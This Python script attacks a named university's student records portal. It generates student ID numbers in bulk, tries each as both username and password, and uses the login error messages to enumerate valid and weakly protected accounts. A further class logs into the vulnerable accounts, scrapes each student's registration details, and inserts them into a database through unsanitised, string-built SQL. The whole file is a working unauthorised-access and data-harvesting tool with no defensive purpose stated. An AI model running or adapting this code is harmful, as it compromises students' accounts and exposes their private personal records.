# -*- coding:utf-8 -*-
""" 
@author:James
Created on:18-2-8 14:25
"""

import gevent
import urllib3
from lxml import etree

from URPScrapy import db_init

# 登录 (GET)
URL_LOGIN = 'http://lgjwxt.hebust.edu.cn/loginAction.do'
# 登出 (POST only)
URL_LOGOUT = 'http://lgjwxt.hebust.edu.cn/logout.do?loginType=platformLogin'
# 学籍信息 (GET)
URL_XJXX = 'http://lgjwxt.hebust.edu.cn/xjInfoAction.do?oper=xjxx'


# 账号生成器
class InfoAccount(object):
	def __init__(self):
		# 所有生成的账号
		self.accounts = []
		# 年级
		grade = 15
		# 理工
		separator = 'L'
		# 学部
		college = ['01', '02', '03', '04', '05', '06', '07']
		# 专业
		sub = ['51', '52']

		for c in college:
			for s in sub:
				pre = str(grade) + separator + c + s
				for i in range(1, 300):
					username = pre + str(i).zfill(3)
					self.accounts.append(username)


# 账号校验器
class InfoValidate(object):
	def __init__(self):
		self.http = urllib3.PoolManager()
		# 有效账号
		self.account_valid = []
		# 可爬账号
		self.account_available = []

	def validate(self, all_account):
		jobs = [gevent.spawn(self.validate_account, self.http, a) for a in all_account]
		gevent.joinall(jobs, timeout=2)

	def validate_account(self, http, account):
		param = {"zjh": account, "mm": account}
		response = http.request('GET', URL_LOGIN, fields=param)
		print('发送请求>>{}'.format(param))
		res_text = response.data.decode('GB2312')

		if res_text.__contains__('密码不正确'):
			# 密码有误
			self.account_valid.append(account)
		elif res_text.__contains__('你输入的证件号不存在，请您重新输入！'):
			# 证件号无效
			pass
		else:
			# 账号可爬
			self.account_available.append(account)
			print("账号可用>>>{}".format(account))
		# self.save_valid_account(account)

		# 保存可用账号
		# def save_valid_account(self, account):
		# 	db = db_init.connect_db()
		# 	sql = 'INSERT INTO URP_USER_HEBUST_LG VALUES (NULL,\'{}\')'.format(account)
		# 	print('>>>{}'.format(sql))
		# 	db.cursor().execute(sql)
		# 	db.commit()
		# 	db.close()


class InfoCollect(object):
	def __init__(self):
		self.http = urllib3.PoolManager()

	def get_info(self, available):
		accounts = available
		for a in accounts:
			# 先登录，获取 Cookie
			param = {'zjh': a, 'mm': a}
			response = self.http.request('GET', URL_LOGIN, fields=param)
			set_cookie = response.headers['Set-Cookie']
			headers = {
				'Set-Cookie': set_cookie
			}
			response_xjxx = self.http.request('GET', URL_XJXX, headers=headers)
			text = response_xjxx.data.decode('GB2312')
			selector = etree.HTML(text)
			text_arr = selector.xpath('//td[starts-with(@width,"275")]/text()')
			# 学籍信息
			result = []
			for info in text_arr:
				result.append(info.strip())
			self.save_info(result)
			# 登出
			self.http.request('POST', URL_LOGOUT, headers=headers)

	def save_info(self, info):
		db = InfoMain.db
		sql_str = 'INSERT INTO URP_INFO_HEBUST_LG VALUES (NULL ,'
		for i in info:
			sql_str += "\'" + str(i) + "\'" + ','
		sql_str = sql_str[0:sql_str.__len__() - 1]
		sql_str += ")"
		print(sql_str)
		db.cursor().execute(sql_str)
		db.commit()


class InfoMain(object):
	db = db_init.connect_db()

	def autorun(self):
		account = InfoAccount()
		# 生成的所有账号
		all_account = account.accounts
		print(all_account)
		# 账号校验器
		validator = InfoValidate()
		validator.validate(all_account=all_account)
		print(validator.account_available)
		# collector = InfoCollect()
		# collector.get_info(validator.account_available)


if __name__ == '__main__':
	app = InfoMain()
	app.autorun()
